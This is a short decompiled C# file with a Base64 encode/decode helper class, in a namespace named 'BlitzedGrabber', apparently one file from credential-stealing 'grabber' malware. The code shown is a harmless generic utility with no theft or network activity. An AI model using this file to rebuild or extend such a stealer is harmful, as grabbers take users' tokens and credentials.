using System;
using System.Text;

namespace BlitzedGrabber
{
	// Token: 0x0200001F RID: 31
	internal class Base64
	{
		// Token: 0x0600008E RID: 142 RVA: 0x00009DD4 File Offset: 0x00007FD4
		public static string Base64Encode(string plainText)
		{
			return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
		}

		// Token: 0x0600008F RID: 143 RVA: 0x00009DE8 File Offset: 0x00007FE8
		public string Base64Decode(string base64EncodedData)
		{
			byte[] base64EncodedBytes = Convert.FromBase64String(base64EncodedData);
			return Encoding.UTF8.GetString(base64EncodedBytes);
		}
	}
}
